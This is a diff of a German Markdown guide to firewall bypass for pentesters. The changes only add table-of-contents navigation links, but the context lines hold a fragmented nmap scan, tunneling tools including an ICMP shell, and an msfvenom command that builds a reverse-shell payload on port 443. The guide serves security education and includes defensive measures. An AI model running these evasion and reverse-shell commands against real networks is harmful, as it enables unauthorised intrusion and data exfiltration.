@@ -14,6 +14,14 @@
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Einleitung
 
 Firewalls sind Sicherheitsmechanismen, die den Netzwerkverkehr auf Basis definierter Regeln filtern. Sie dienen dazu:
@@ -22,6 +30,14 @@ Firewalls sind Sicherheitsmechanismen, die den Netzwerkverkehr auf Basis definie
 - **Verbindungen zu blockieren oder zuzulassen**
 
 Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z. B. durch Tarnung oder Manipulation des Traffics. Dieses Wissen ist für **Pentester** und **Security Analysts** essenziell, um Schwächen in der Konfiguration zu erkennen.
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Arten von Firewalls
@@ -52,6 +68,14 @@ Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z.
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Häufige Techniken zur Umgehung
 
 ### 1. **Tarnung über erlaubte Ports**
@@ -66,6 +90,14 @@ Oder:
 
 - Reverse Shell über Port 443 senden
 - Malware über Port 53 (DNS-Tunnel) exfiltrieren
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ### 2. Payload Obfuscation
@@ -83,6 +115,14 @@ Beispiele:
 # Hex oder Base64 verschlüsselt
 ```
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 3. Fragmentierung von Paketen
 
 Durch Aufteilen des Paketinhalts auf mehrere TCP-Segmente kann die Firewall umgangen werden, wenn sie keine vollständige Rekonstruktion vornimmt.
@@ -90,6 +130,14 @@ Durch Aufteilen des Paketinhalts auf mehrere TCP-Segmente kann die Firewall umga
 ```bash
 nmap -f target.com      # Fragmentierter Scan
 ```
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 4. Protocol Tunneling (DNS, ICMP, HTTP)
 
@@ -101,6 +149,14 @@ Tools:
 - iodine – Internet over DNS
 - httptunnel – TCP-Tunnel via HTTP
 - icmpsh – Shell über ICMP
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ### 5. Über Ports, die der Firewall "vertrauenswürdig" erscheinen
@@ -131,6 +187,14 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Verteidigungsmaßnahmen (Blue Team)
 
 - Port-Whitelisting: Nur notwendige Ports erlauben
@@ -142,6 +206,14 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Lernressourcen
 
 - TryHackMe: Rooms zu „Firewall Evasion“ und „Nmap Advanced“
@@ -149,6 +221,14 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 - YouTube: John Hammond, The Cyber Mentor – „Firewall Evasion Techniques“
 - Bücher: „The Hacker Playbook 3“, „Nmap Network Scanning“
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Haftungsausschluss
@@ -163,12 +243,6 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 [Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
-
-<div align=right>
-
-[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
-
-</div>
 
 Stay curious – stay secure. 🔐
 
